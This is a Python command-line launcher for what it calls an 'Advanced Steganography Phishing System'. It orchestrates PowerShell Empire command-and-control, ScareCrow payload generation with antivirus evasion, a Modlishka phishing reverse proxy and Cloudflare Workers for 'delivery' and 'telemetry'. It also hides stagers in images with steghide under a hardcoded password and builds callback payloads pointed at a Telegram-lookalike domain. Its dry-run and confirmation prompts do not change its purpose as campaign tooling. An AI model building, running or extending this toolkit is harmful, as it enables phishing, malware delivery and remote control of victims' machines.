#!/usr/bin/env python3
"""
Advanced Steganography Phishing System - CLI Launcher
Complete toolkit launcher with Empire, ScareCrow, Steganography, and Cloudflare Workers
"""

import os
import sys
import json
import yaml
import subprocess
import typer
from typing import Optional, Dict, Any
from pathlib import Path
import tempfile
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.prompt import Confirm, Prompt
from rich import print as rprint

app = typer.Typer(rich_markup_mode="rich")
console = Console()

# Configuration
BASE_DIR = Path(__file__).parent.absolute()
CONFIG_DIR = BASE_DIR / "configs"
TOOLS_DIR = BASE_DIR / "tools"
LOGS_DIR = BASE_DIR / "logs"
STATE_DIR = BASE_DIR / "state"

# Ensure directories exist
for d in [CONFIG_DIR, LOGS_DIR, STATE_DIR]:
    d.mkdir(exist_ok=True)

class SystemConfig:
    def __init__(self):
        self.config_file = CONFIG_DIR / "global.yml"
        self.load_config()
    
    def load_config(self):
        if self.config_file.exists():
            with open(self.config_file) as f:
                self.config = yaml.safe_load(f) or {}
        else:
            self.config = self.default_config()
            self.save_config()
    
    def default_config(self):
        return {
            'tools': {
                'empire': {
                    'enabled': True,
                    'path': str(TOOLS_DIR / 'empire'),
                    'port': 1337,
                    'host': '127.0.0.1'
                },
                'starkiller': {
                    'enabled': True,
                    'path': str(TOOLS_DIR / 'starkiller'),
                    'port': 9090
                },
                'scarecrow': {
                    'enabled': True,
                    'path': str(TOOLS_DIR / 'scarecrow'),
                    'binary': 'ScareCrow'
                },
                'bobthesmuggler': {
                    'enabled': True,
                    'path': str(TOOLS_DIR / 'bobthesmuggler')
                },
                'modlishka': {
                    'enabled': True,
                    'path': str(TOOLS_DIR / 'modlishka')
                },
                'steganography': {
                    'enabled': True,
                    'password': 'telegram2025research',
                    'carrier_dir': str(BASE_DIR / 'large-stego-images'),
                    'output_dir': str(BASE_DIR / 'stego-output')
                }
            },
            'cloudflare': {
                'domain': 'telegrams.app',
                'workers_dir': str(BASE_DIR / 'workers')
            },
            'safety': {
                'dry_run_default': True,
                'require_confirmation': True,
                'log_all_commands': True
            }
        }
    
    def save_config(self):
        with open(self.config_file, 'w') as f:
            yaml.dump(self.config, f, default_flow_style=False)
    
    def get(self, key: str, default=None):
        keys = key.split('.')
        value = self.config
        for k in keys:
            value = value.get(k, {})
        return value if value != {} else default

config = SystemConfig()

def log_command(command: str, result: str = ""):
    """Log commands and results"""
    timestamp = datetime.now().isoformat()
    log_entry = {
        'timestamp': timestamp,
        'command': command,
        'result': result,
        'cwd': str(Path.cwd())
    }
    
    log_file = LOGS_DIR / 'commands.json'
    if log_file.exists():
        with open(log_file) as f:
            logs = json.load(f)
    else:
        logs = []
    
    logs.append(log_entry)
    
    with open(log_file, 'w') as f:
        json.dump(logs, f, indent=2)

def run_command(cmd: list, dry_run: bool = None, confirm: bool = None) -> tuple:
    """Execute command with safety checks"""
    if dry_run is None:
        dry_run = config.get('safety.dry_run_default', True)
    
    if confirm is None:
        confirm = config.get('safety.require_confirmation', True)
    
    cmd_str = ' '.join(cmd)
    
    if dry_run:
        rprint(f"[yellow]DRY RUN:[/yellow] {cmd_str}")
        log_command(f"DRY RUN: {cmd_str}")
        return True, "Dry run - command not executed"
    
    if confirm:
        if not Confirm.ask(f"Execute: {cmd_str}?"):
            rprint("[red]Command cancelled by user[/red]")
            return False, "Cancelled by user"
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        log_command(cmd_str, f"Exit: {result.returncode}, Out: {result.stdout[:200]}")
        return result.returncode == 0, result.stdout + result.stderr
    except Exception as e:
        log_command(cmd_str, f"Error: {str(e)}")
        return False, str(e)

@app.command()
def doctor():
    """🏥 System health check and diagnostics"""
    rprint("[bold blue]🏥 System Diagnostics[/bold blue]")
    
    table = Table(title="Environment Check")
    table.add_column("Component", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Version/Path")
    
    # Check Python
    python_version = sys.version.split()[0]
    table.add_row("Python", "✅ OK", python_version)
    
    # Check dependencies
    try:
        import yaml, typer, rich
        table.add_row("Python Dependencies", "✅ OK", "All required packages installed")
    except ImportError as e:
        table.add_row("Python Dependencies", "❌ MISSING", str(e))
    
    # Check tools
    for tool_name, tool_config in config.get('tools', {}).items():
        if tool_config.get('enabled'):
            tool_path = Path(tool_config.get('path', ''))
            if tool_path.exists():
                table.add_row(f"Tool: {tool_name}", "✅ OK", str(tool_path))
            else:
                table.add_row(f"Tool: {tool_name}", "❌ MISSING", f"Path: {tool_path}")
    
    # Check Cloudflare CLI
    try:
        result = subprocess.run(['wrangler', '--version'], capture_output=True)
        if result.returncode == 0:
            table.add_row("Wrangler CLI", "✅ OK", result.stdout.decode().strip())
        else:
            table.add_row("Wrangler CLI", "❌ MISSING", "Not installed")
    except:
        table.add_row("Wrangler CLI", "❌ MISSING", "Not found in PATH")
    
    # Check steganography tools
    try:
        result = subprocess.run(['steghide', '--version'], capture_output=True)
        if result.returncode == 0:
            table.add_row("Steghide", "✅ OK", "Available")
        else:
            table.add_row("Steghide", "❌ MISSING", "Not installed")
    except:
        table.add_row("Steghide", "❌ MISSING", "Not found in PATH")
    
    console.print(table)
    
    # Next steps
    rprint("\n[bold green]📋 Next Steps:[/bold green]")
    rprint("• Run [cyan]launcher tools list[/cyan] to see available tools")
    rprint("• Run [cyan]launcher stego encode --help[/cyan] for steganography options")
    rprint("• Run [cyan]launcher c2 status[/cyan] to check C2 infrastructure")

@app.command()
def setup():
    """🚀 Initialize complete system setup"""
    if not Confirm.ask("This will set up the complete system. Continue?"):
        return
    
    rprint("[bold green]🚀 Setting up Advanced Steganography Phishing System[/bold green]")
    
    # Run setup script
    setup_script = BASE_DIR / "setup-complete-system.sh"
    if setup_script.exists():
        success, output = run_command([str(setup_script)], dry_run=False, confirm=False)
        if success:
            rprint("[green]✅ Setup completed successfully[/green]")
        else:
            rprint(f"[red]❌ Setup failed: {output}[/red]")
    else:
        rprint("[yellow]⚠️  Setup script not found[/yellow]")

# Tools management
tools_app = typer.Typer()
app.add_typer(tools_app, name="tools", help="🔧 Manage security tools")

@tools_app.command("list")
def tools_list():
    """List all available tools"""
    table = Table(title="Available Security Tools")
    table.add_column("Tool", style="cyan")
    table.add_column("Status", style="green")
    table.add_column("Path")
    table.add_column("Description")
    
    tools_info = {
        'empire': 'PowerShell Empire C2 Framework',
        'starkiller': 'Empire GUI Interface',
        'scarecrow': 'Payload generator with AV evasion',
        'bobthesmuggler': 'Living-off-the-land binaries',
        'modlishka': 'Advanced phishing reverse proxy',
        'steganography': 'Advanced steganography system'
    }
    
    for tool_name, description in tools_info.items():
        tool_config = config.get(f'tools.{tool_name}', {})
        if tool_config.get('enabled'):
            status = "✅ Enabled"
            path = tool_config.get('path', 'Not configured')
        else:
            status = "❌ Disabled"
            path = "N/A"
        
        table.add_row(tool_name, status, path, description)
    
    console.print(table)

@tools_app.command("start")
def tools_start(
    tool: str,
    dry_run: bool = typer.Option(True, "--execute/--dry-run", help="Execute or dry run"),
    background: bool = typer.Option(False, "--background", help="Run in background")
):
    """Start a security tool"""
    if tool == "empire":
        start_empire(dry_run, background)
    elif tool == "starkiller":
        start_starkiller(dry_run, background)
    elif tool == "modlishka":
        start_modlishka(dry_run)
    else:
        rprint(f"[red]Tool '{tool}' start method not implemented[/red]")

def start_empire(dry_run: bool, background: bool):
    """Start PowerShell Empire"""
    empire_path = Path(config.get('tools.empire.path'))
    if not empire_path.exists():
        rprint(f"[red]Empire not found at {empire_path}[/red]")
        return
    
    cmd = [
        'python3',
        str(empire_path / 'ps-empire'),
        '--rest-port', str(config.get('tools.empire.port', 1337))
    ]
    
    success, output = run_command(cmd, dry_run=dry_run)
    if success and not dry_run:
        rprint("[green]✅ Empire started successfully[/green]")
        if background:
            rprint("Running in background...")
    else:
        rprint(f"[red]❌ Failed to start Empire: {output}[/red]")

def start_starkiller(dry_run: bool, background: bool):
    """Start Starkiller GUI"""
    rprint("[blue]Starting Starkiller GUI...[/blue]")
    # Implementation would go here

def start_modlishka(dry_run: bool):
    """Start Modlishka phishing proxy"""
    rprint("[blue]Starting Modlishka...[/blue]")
    # Implementation would go here

# C2 Management
c2_app = typer.Typer()
app.add_typer(c2_app, name="c2", help="🎯 Command & Control management")

@c2_app.command("status")
def c2_status():
    """Check C2 infrastructure status"""
    rprint("[bold blue]🎯 C2 Infrastructure Status[/bold blue]")
    
    # Check Empire status
    empire_port = config.get('tools.empire.port', 1337)
    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex(('127.0.0.1', empire_port))
        if result == 0:
            rprint(f"[green]✅ Empire: Running on port {empire_port}[/green]")
        else:
            rprint(f"[red]❌ Empire: Not running on port {empire_port}[/red]")
        sock.close()
    except:
        rprint("[red]❌ Empire: Connection check failed[/red]")

@c2_app.command("configure")
def c2_configure():
    """Configure C2 settings"""
    rprint("[blue]🔧 Configuring C2 settings...[/blue]")
    
    # Interactive configuration
    domain = Prompt.ask("Enter your domain", default=config.get('cloudflare.domain', 'telegrams.app'))
    empire_port = Prompt.ask("Enter Empire port", default=str(config.get('tools.empire.port', 1337)))
    
    # Update config
    config.config['cloudflare']['domain'] = domain
    config.config['tools']['empire']['port'] = int(empire_port)
    config.save_config()
    
    rprint("[green]✅ C2 configuration updated[/green]")

# Steganography
stego_app = typer.Typer()
app.add_typer(stego_app, name="stego", help="🖼️  Steganography operations")

@stego_app.command("encode")
def stego_encode(
    payload: str = typer.Option(..., help="Path to payload file"),
    carrier: str = typer.Option(..., help="Path to carrier image"),
    output: str = typer.Option(..., help="Output image path"),
    password: str = typer.Option("telegram2025research", help="Steganography password"),
    dry_run: bool = typer.Option(True, "--execute/--dry-run")
):
    """Encode payload into carrier image"""
    rprint(f"[blue]🖼️  Encoding {payload} into {carrier}[/blue]")
    
    if not Path(payload).exists():
        rprint(f"[red]❌ Payload file not found: {payload}[/red]")
        return
    
    if not Path(carrier).exists():
        rprint(f"[red]❌ Carrier image not found: {carrier}[/red]")
        return
    
    cmd = [
        'steghide', 'embed',
        '-cf', carrier,
        '-ef', payload,
        '-sf', output,
        '-p', password,
        '-z', '9',
        '-e', 'des',
        '-q'
    ]
    
    success, result = run_command(cmd, dry_run=dry_run)
    if success and not dry_run:
        rprint(f"[green]✅ Successfully encoded payload into {output}[/green]")
    else:
        rprint(f"[red]❌ Encoding failed: {result}[/red]")

@stego_app.command("decode")
def stego_decode(
    input_file: str = typer.Option(..., help="Path to steganographic image"),
    output: str = typer.Option(..., help="Output payload path"),
    password: str = typer.Option("telegram2025research", help="Steganography password"),
    dry_run: bool = typer.Option(True, "--execute/--dry-run")
):
    """Decode payload from steganographic image"""
    rprint(f"[blue]🖼️  Decoding {input_file} to {output}[/blue]")
    
    if not Path(input_file).exists():
        rprint(f"[red]❌ Input file not found: {input_file}[/red]")
        return
    
    cmd = [
        'steghide', 'extract',
        '-sf', input_file,
        '-xf', output,
        '-p', password,
        '-q'
    ]
    
    success, result = run_command(cmd, dry_run=dry_run)
    if success and not dry_run:
        rprint(f"[green]✅ Successfully decoded payload to {output}[/green]")
    else:
        rprint(f"[red]❌ Decoding failed: {result}[/red]")

@stego_app.command("batch")
def stego_batch():
    """Batch process stagers into steganographic images"""
    rprint("[blue]🎯 Starting batch steganography processing...[/blue]")
    
    # Run our large-stego-system.py
    stego_script = BASE_DIR / "large-stego-system.py"
    if stego_script.exists():
        cmd = ['python3', str(stego_script), 'process']
        success, result = run_command(cmd, dry_run=False, confirm=True)
        if success:
            rprint("[green]✅ Batch processing completed[/green]")
        else:
            rprint(f"[red]❌ Batch processing failed: {result}[/red]")
    else:
        rprint("[red]❌ Steganography script not found[/red]")

# Cloudflare
cf_app = typer.Typer()
app.add_typer(cf_app, name="cloudflare", help="☁️  Cloudflare Workers management")

@cf_app.command("deploy")
def cloudflare_deploy(
    worker: str = typer.Option("all", help="Worker to deploy (all, fingerprint, delivery, telemetry)"),
    dry_run: bool = typer.Option(True, "--execute/--dry-run")
):
    """Deploy Cloudflare Workers"""
    rprint(f"[blue]☁️  Deploying Cloudflare Worker: {worker}[/blue]")
    
    workers_dir = Path(config.get('cloudflare.workers_dir'))
    if not workers_dir.exists():
        rprint(f"[red]❌ Workers directory not found: {workers_dir}[/red]")
        return
    
    if worker == "all":
        worker_files = list(workers_dir.glob("*.js"))
    else:
        worker_files = [workers_dir / f"{worker}.js"]
    
    for worker_file in worker_files:
        if worker_file.exists():
            cmd = ['wrangler', 'deploy', str(worker_file)]
            success, result = run_command(cmd, dry_run=dry_run)
            if success and not dry_run:
                rprint(f"[green]✅ Deployed {worker_file.name}[/green]")
            else:
                rprint(f"[red]❌ Failed to deploy {worker_file.name}: {result}[/red]")
        else:
            rprint(f"[yellow]⚠️  Worker file not found: {worker_file}[/yellow]")

@cf_app.command("status")
def cloudflare_status():
    """Check Cloudflare Workers status"""
    rprint("[blue]☁️  Checking Cloudflare Workers status...[/blue]")
    
    cmd = ['wrangler', 'deployments', 'list']
    success, result = run_command(cmd, dry_run=False, confirm=False)
    if success:
        rprint("[green]✅ Cloudflare status retrieved[/green]")
        console.print(result)
    else:
        rprint(f"[red]❌ Failed to get status: {result}[/red]")

# Payload generation
payload_app = typer.Typer()
app.add_typer(payload_app, name="payload", help="🚀 Payload generation")

@payload_app.command("generate")
def payload_generate(
    target: str = typer.Option("windows", help="Target platform (windows, linux)"),
    format: str = typer.Option("exe", help="Output format (exe, dll, shellcode)"),
    lhost: str = typer.Option("127.0.0.1", help="Listener host"),
    lport: int = typer.Option(4444, help="Listener port"),
    dry_run: bool = typer.Option(True, "--execute/--dry-run")
):
    """Generate payloads using ScareCrow"""
    rprint(f"[blue]🚀 Generating {target} {format} payload[/blue]")
    
    scarecrow_path = Path(config.get('tools.scarecrow.path'))
    binary_name = config.get('tools.scarecrow.binary', 'ScareCrow')
    scarecrow_binary = scarecrow_path / binary_name
    
    if not scarecrow_binary.exists():
        rprint(f"[red]❌ ScareCrow not found at {scarecrow_binary}[/red]")
        return
    
    output_name = f"payload_{target}_{format}.exe"
    
    cmd = [
        str(scarecrow_binary),
        '-I', f'{lhost}:{lport}',
        '-Domain', config.get('cloudflare.domain', 'telegrams.app'),
        '-o', output_name
    ]
    
    success, result = run_command(cmd, dry_run=dry_run)
    if success and not dry_run:
        rprint(f"[green]✅ Payload generated: {output_name}[/green]")
    else:
        rprint(f"[red]❌ Payload generation failed: {result}[/red]")

@payload_app.command("list")
def payload_list():
    """List generated payloads"""
    rprint("[blue]🚀 Generated Payloads[/blue]")
    
    table = Table(title="Available Payloads")
    table.add_column("Filename", style="cyan")
    table.add_column("Size", style="green") 
    table.add_column("Modified")
    
    # Check common payload directories
    payload_dirs = [
        BASE_DIR / "payloads",
        TOOLS_DIR / "scarecrow",
        BASE_DIR
    ]
    
    payload_files = []
    for payload_dir in payload_dirs:
        if payload_dir.exists():
            payload_files.extend(payload_dir.glob("*.exe"))
    
    for payload_file in payload_files:
        if payload_file.exists():
            stat = payload_file.stat()
            size = f"{stat.st_size // 1024}KB"
            modified = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M")
            table.add_row(payload_file.name, size, modified)
    
    if payload_files:
        console.print(table)
    else:
        rprint("[yellow]No payloads found[/yellow]")

# Git management
git_app = typer.Typer()
app.add_typer(git_app, name="git", help="📦 Git repository management")

@git_app.command("status")
def git_status():
    """Check git repository status"""
    cmd = ['git', 'status', '--porcelain']
    success, result = run_command(cmd, dry_run=False, confirm=False)
    if success:
        if result.strip():
            rprint("[yellow]📦 Repository has changes:[/yellow]")
            console.print(result)
        else:
            rprint("[green]📦 Repository is clean[/green]")
    else:
        rprint("[red]❌ Not a git repository[/red]")

@git_app.command("commit")
def git_commit(
    message: str = typer.Option(..., help="Commit message"),
    push: bool = typer.Option(False, "--push", help="Push after commit")
):
    """Commit changes to repository"""
    # Add all files
    cmd_add = ['git', 'add', '.']
    success, result = run_command(cmd_add, dry_run=False, confirm=True)
    if not success:
        rprint(f"[red]❌ Failed to add files: {result}[/red]")
        return
    
    # Commit
    cmd_commit = ['git', 'commit', '-m', message]
    success, result = run_command(cmd_commit, dry_run=False, confirm=False)
    if success:
        rprint("[green]✅ Changes committed successfully[/green]")
        
        if push:
            cmd_push = ['git', 'push']
            success, result = run_command(cmd_push, dry_run=False, confirm=True)
            if success:
                rprint("[green]✅ Changes pushed to remote[/green]")
            else:
                rprint(f"[red]❌ Failed to push: {result}[/red]")
    else:
        rprint(f"[red]❌ Commit failed: {result}[/red]")

if __name__ == "__main__":
    app()